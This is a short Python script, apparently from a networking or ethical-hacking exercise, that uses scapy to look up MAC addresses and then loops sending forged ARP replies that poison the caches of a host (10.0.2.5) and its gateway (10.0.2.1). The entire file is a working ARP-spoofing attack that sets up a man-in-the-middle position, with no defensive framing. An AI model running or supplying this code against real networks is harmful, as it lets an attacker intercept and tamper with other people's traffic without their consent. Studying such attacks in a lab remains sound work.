import scapy.all as scapy
import time
import sys

# function to extract mac address of devices in a network
def get_mac(ip):
  arp_req = scapy.ARP(pdst=ip,)
  #print(arp_req.summary())
  broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
  #print(broadcast.summary())
  #scapy.ls(scapy.ARP())
  
  packet = broadcast/arp_req
  #print(packet.summary())
  #packet.show()
  response_list = scapy.srp(packet, timeout=1, verbose = False)[0]
  
  #print(answered_list.summary())
  return response_list[0][1].hwsrc
  
def arp_spoofing(target_ip, spoof_ip):
  target_mac = get_mac(target_ip)
  packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
  scapy.send(packet, verbose = False)

sent_packets = 0  
try:
  while True:
    arp_spoofing("10.0.2.5", "10.0.2.1")
    arp_spoofing("10.0.2.1", "10.0.2.5")
    sent_packets = sent_packets + 2
    print("\r[*] Packets sent: " + str(sent_packets)),
    sys.stdout.flush()
    time.sleep(2)
except KeyboardInterrupt:
  print("[*] Ctrl+C detected..........AdiOs")
